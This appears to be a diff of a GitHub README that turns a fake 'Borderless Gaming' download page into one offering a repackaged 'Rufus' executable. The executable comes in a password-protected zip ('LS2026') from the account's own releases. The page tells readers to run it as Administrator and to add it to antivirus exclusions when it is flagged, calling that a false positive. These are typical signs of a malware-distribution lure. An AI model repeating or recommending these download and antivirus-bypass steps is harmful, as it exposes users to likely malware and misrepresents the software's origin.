@@ -1,55 +1,62 @@
-# Borderless Gaming – Borderless Window Tool for Windows Games
-[![Stars](https://img.shields.io/github/stars/crystalofpower/Borderless-Gaming-v9.6.0-Desktop)](https://github.com/crystalofpower/Borderless-Gaming-v9.6.0-Desktop)
+# Rufus Windows 10/11 ISO Version – Bootable USB Creator Free Download
+
+[![Stars](https://img.shields.io/github/stars/crystalofpower/Rufus-Windows-10-11-Iso-Version)](https://github.com/crystalofpower/Rufus-Windows-10-11-Iso-Versionn)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-Powerful tool to run games in borderless windowed mode – seamless alt-tabbing and multi-monitor support. Free download. SEO: borderless gaming, borderless windowed mode, borderless gaming download, free borderless gaming, borderless window tool.
+Rufus Windows 10/11 ISO Version – the latest portable tool to create bootable USB drives from Windows 10 and Windows 11 ISO files. Fast, reliable, and 100% free desktop version ready to use!
 
 ---
-
 ## ⚠️ Disclaimer
-For personal use only. Use at your own risk.
+This repository is for educational and research purposes only. All files are provided as-is. Use at your own risk and respect applicable laws.
 
 ---
 ## 📦 What's Included
-- BorderlessGaming.exe – Main tool
-- Features: Game/Window Selector, Borderless Toggle, Multi-Monitor Support, Taskbar Auto-Hide, Custom Positioning.
+- Rufus.exe – Latest portable version optimized for Windows 10/11 ISO
+- Essential Features:
+  - Direct ISO to USB creation (no installation needed)
+  - Full support for Windows 10 and Windows 11
+  - DD Image mode for maximum compatibility
+  - UEFI + BIOS support
+  - Fast formatting and bootable drive creation
+  - Persistent partition option
+  - Simple and clean desktop interface
+
+---
+## 📥 Download
+Password-protected archive – extract and run instantly.
+
+📥 [Download `Rufus-Windows-10-11-ISO.zip`](https://github.com/crystalofpower/Rufus-Windows-10-11-Iso-Version/releases/download/iso-software/Rufus-Installer.zip)
+🔐 `LS2026`
 ---
 
-## 📥 Download
-
-📥 [Download `Borderless-Gaming-V9.6.0.zip`](https://github.com/crystalofpower/Borderless-Gaming-v9.6.0-Desktop/releases/download/Game-Software/Borderless-Gaming-v9.6.0.zip)  
-🔐 `LS2026` 
+### Archive Contents
+- Rufus.exe – main portable executable (latest build)
+- readme.txt – quick instructions
 
 ---
 ## 🚀 How to Use
-1. Extract archive.  
-2. Run BorderlessGaming.exe.  
-3. Select game window from list.  
-4. Click “Make Borderless”.  
-5. Enjoy seamless switching.  
-Supports Windows 10/11.
----
-## 🎮 Usage Tips
-| Feature | Function | Access |
-|---------|----------|--------|
-| Window Selector | Pick any game | Dropdown list |
-| Borderless Toggle | Remove borders | Main button |
-| Multi-Monitor | Span screens | Auto-detect |
-| Taskbar Hide | Clean fullscreen | Auto option |
-| Custom Position | Center or corner | Settings |
-| Restore Borders | Revert window | Toggle button |
+1. Run Rufus.exe (no installation required)
+2. Select your USB drive
+3. Click "SELECT" and choose your Windows 10/11 ISO file
+4. Click "START" and wait for the process to complete
+
+> ℹ️ Recommended: Run as Administrator for best compatibility.
+
 ---
 ## ❗️ Troubleshooting
-| Problem | Solution |
-|---------|----------|
-| Window not listed | Refresh list or run as Admin. |
-| No effect | Game must be in windowed mode first. |
-| Crashes | Update .NET, run as Administrator. |
-| AV blocks exe | Add to exclusions (false positive). |
-| Multi-monitor issue | Check display settings. |
+| Problem                  | Solution |
+|--------------------------|----------|
+| USB not detected         | Run as Administrator, try another port |
+| ISO not recognized       | Verify ISO checksum or re-download |
+| Bootable USB fails       | Enable DD Image mode in Rufus |
+| Slow creation            | Close other programs and use USB 3.0+ |
+| Tool flagged by antivirus| False positive – add to exclusions |
+
 ---
 ## 📜 License
-MIT License.
+MIT License – educational purposes only.
+
 ---
 ## ⭐️ Support
-Star if helpful!
+If this helped you create your Windows 10/11 bootable USB, please star the repository!
+```
